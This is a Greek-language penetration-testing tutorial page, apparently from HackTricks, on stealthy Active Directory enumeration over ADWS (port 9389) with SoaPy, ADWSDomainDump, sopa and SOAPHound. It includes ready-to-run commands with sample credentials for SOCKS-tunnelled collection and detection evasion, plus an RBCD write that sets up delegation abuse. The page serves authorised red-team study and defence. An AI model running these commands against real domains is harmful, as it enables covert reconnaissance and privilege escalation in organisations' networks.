# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι το ADWS;

Active Directory Web Services (ADWS) είναι **ενεργοποιημένο από προεπιλογή σε κάθε Domain Controller από τα Windows Server 2008 R2** και ακούει στο TCP **9389**. Παρόλο το όνομα, **δεν εμπλέκεται HTTP**. Αντίθετα, η υπηρεσία εκθέτει δεδομένα σε στυλ LDAP μέσω στοίβας ιδιόκτητων .NET framing πρωτοκόλλων:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Επειδή η κίνηση είναι ενθυλακωμένη μέσα σε αυτά τα δυαδικά SOAP frames και ταξιδεύει πάνω από μια ασυνήθιστη θύρα, **η enumeration μέσω ADWS είναι πολύ λιγότερο πιθανό να ελεγχθεί, φιλτραριστεί ή signatured σε σχέση με την κλασική LDAP/389 & 636 κίνηση**. Για τους χειριστές αυτό σημαίνει:

* Stealthier recon – Οι Blue teams συχνά συγκεντρώνονται σε LDAP queries.
* Ελευθερία να συλλέξετε από **non-Windows hosts (Linux, macOS)** με tunnelling του 9389/TCP μέσω SOCKS proxy.
* Τα ίδια δεδομένα που θα λαμβάνατε μέσω LDAP (users, groups, ACLs, schema, κ.λπ.) και η δυνατότητα εκτέλεσης **writes** (π.χ. `msDs-AllowedToActOnBehalfOfOtherIdentity` για **RBCD**).

Οι αλληλεπιδράσεις ADWS υλοποιούνται πάνω σε WS-Enumeration: κάθε query ξεκινάει με ένα μήνυμα `Enumerate` που ορίζει το LDAP filter/attributes και επιστρέφει ένα `EnumerationContext` GUID, ακολουθούμενο από ένα ή περισσότερα μηνύματα `Pull` που ροδεύουν μέχρι το παράθυρο αποτελεσμάτων που ορίζει ο server. Οι contexts λήγουν μετά από ~30 λεπτά, οπότε τα εργαλεία είτε πρέπει να σελιδοποιούν τα αποτελέσματα είτε να σπάζουν τα φίλτρα (prefix queries ανά CN) για να αποφύγουν την απώλεια του state. Όταν ζητάτε security descriptors, προσδιορίστε τον έλεγχο `LDAP_SERVER_SD_FLAGS_OID` για να παραλείψετε τα SACLs, διαφορετικά το ADWS απλά παραλείπει το attribute `nTSecurityDescriptor` από την SOAP απάντησή του.

> NOTE: ADWS is also used by many RSAT GUI/PowerShell tools, so traffic may blend with legitimate admin activity.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) είναι μια **πλήρης επαν-υλοποίηση της ADWS protocol stack σε καθαρό Python**. Κατασκευάζει τα NBFX/NBFSE/NNS/NMF frames byte-for-byte, επιτρέποντας συλλογή από Unix-like συστήματα χωρίς να χρειάζεται το .NET runtime.

### Κύρια χαρακτηριστικά

* Υποστηρίζει **proxying through SOCKS** (χρήσιμο από C2 implants).
* Λεπτομερή search filters ταυτόσημα με LDAP `-q '(objectClass=user)'`.
* Προαιρετικές **write** λειτουργίες ( `--set` / `--delete` ).
* **BOFHound output mode** για άμεση εισαγωγή στο BloodHound.
* `--parse` flag για ωραιοποίηση timestamps / `userAccountControl` όταν απαιτείται αναγνωσιμότητα από άνθρωπο.

### Σημαίες στοχευμένης συλλογής και λειτουργίες εγγραφής

Το SoaPy συνοδεύεται από προσεκτικά επιλεγμένα switches που αναπαράγουν τα πιο κοινά LDAP hunting tasks πάνω από ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, καθώς και ωμές επιλογές `--query` / `--filter` για custom pulls. Συνδυάστε αυτά με primitives εγγραφής όπως `--rbcd <source>` (ορίζει `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging για στοχευμένο Kerberoasting) και `--asrep` (αναστρέφει `DONT_REQ_PREAUTH` στο `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Χρησιμοποιήστε τον ίδιο host/credentials για να οπλίσετε άμεσα τα ευρήματα: ανακτήστε RBCD-capable objects με `--rbcds`, στη συνέχεια εφαρμόστε `--rbcd 'WEBSRV01$' --account 'FILE01$'` για να δημιουργήσετε μια Resource-Based Constrained Delegation chain (βλ. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) για την πλήρη διαδρομή κατάχρησης).

### Εγκατάσταση (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork του `ldapdomaindump` που αντικαθιστά LDAP queries με ADWS calls στο TCP/9389 για να μειώσει τα hits από το LDAP-signature.
* Εκτελεί έναν αρχικό έλεγχο προσβασιμότητας στην 9389 εκτός αν περάσει το `--force` (παραλείπει την probe αν τα port scans είναι noisy/filtered).
* Δοκιμάστηκε ενάντια σε Microsoft Defender for Endpoint και CrowdStrike Falcon με επιτυχημένο bypass στο README.

### Εγκατάσταση
```bash
pipx install .
```
### Χρήση
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Η τυπική έξοδος καταγράφει τον έλεγχο προσβασιμότητας 9389, το ADWS bind, και την έναρξη/λήξη του dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Ένας πρακτικός client για το ADWS σε Golang

Όπως και το soapy, [sopa](https://github.com/Macmod/sopa) υλοποιεί το stack πρωτοκόλλου ADWS (MS-NNS + MC-NMF + SOAP) σε Golang, παρέχοντας flags γραμμής εντολών για την εκτέλεση κλήσεων ADWS όπως:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Συλλογή ADWS Μεγάλης Κλίμακας (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) είναι ένας .NET συλλέκτης που διατηρεί όλες τις LDAP αλληλεπιδράσεις εντός του ADWS και εξάγει BloodHound v4-compatible JSON. Δημιουργεί μία πλήρη cache των `objectSid`, `objectGUID`, `distinguishedName` και `objectClass` μια φορά (`--buildcache`), και στη συνέχεια την επαναχρησιμοποιεί για υψηλού όγκου περάσματα `--bhdump`, `--certdump` (ADCS), ή `--dnsdump` (AD-integrated DNS) ώστε μόνο ~35 κρίσιμα attributes να φεύγουν ποτέ από τον DC. Το AutoSplit (`--autosplit --threshold <N>`) διασπά αυτόματα τα queries κατά CN prefix για να παραμένει κάτω από το 30-λεπτο EnumerationContext timeout σε μεγάλα forests.

Τυπική ροή εργασίας σε ένα domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Τα εξαγόμενα JSON εισάγονται απευθείας σε SharpHound/BloodHound workflows — δείτε [BloodHound methodology](bloodhound.md) για ιδέες οπτικοποίησης στη συνέχεια. Το AutoSplit κάνει το SOAPHound ανθεκτικό σε δάση με εκατομμύρια αντικείμενα, διατηρώντας τον αριθμό ερωτημάτων χαμηλότερο από τα snapshots τύπου ADExplorer.

## Ροή Συλλογής Stealth AD

Η παρακάτω ροή εργασίας δείχνει πώς να enumerate **domain & ADCS objects** μέσω ADWS, να τα μετατρέψετε σε BloodHound JSON και να κυνηγήσετε μονοπάτια επίθεσης βασισμένα σε πιστοποιητικά — όλα από Linux:

1. **Tunnel 9389/TCP** από το target δίκτυο στον υπολογιστή σας (π.χ. via Chisel, Meterpreter, SSH dynamic port-forward, κ.λπ.). Εξάγετε `export HTTPS_PROXY=socks5://127.0.0.1:1080` ή χρησιμοποιήστε τα `--proxyHost/--proxyPort` του SoaPy.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Συλλέξτε αντικείμενα σχετικά με το ADCS από το Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Μετατροπή σε BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Ανεβάστε το ZIP** στο BloodHound GUI και εκτελέστε cypher queries όπως `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` για να αποκαλύψετε μονοπάτια κλιμάκωσης πιστοποιητικών (ESC1, ESC8, κ.λπ.).

### Γράφοντας `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Συνδυάστε αυτό με `s4u2proxy`/`Rubeus /getticket` για μια πλήρη **Resource-Based Constrained Delegation** αλυσίδα (βλ. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Περίληψη Εργαλείων

| Purpose | Tool | Notes |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, ανάγνωση/εγγραφή |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS λειτουργίες |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Μετατρέπει αρχεία καταγραφής SoaPy/ldapsearch |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Μπορεί να διαμεσολαβηθεί μέσω του ίδιου SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Γενικός client για αλληλεπίδραση με γνωστά ADWS endpoints - επιτρέπει enumeration, δημιουργία αντικειμένων, τροποποίηση attributes και αλλαγές κωδικών |

## Αναφορές

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
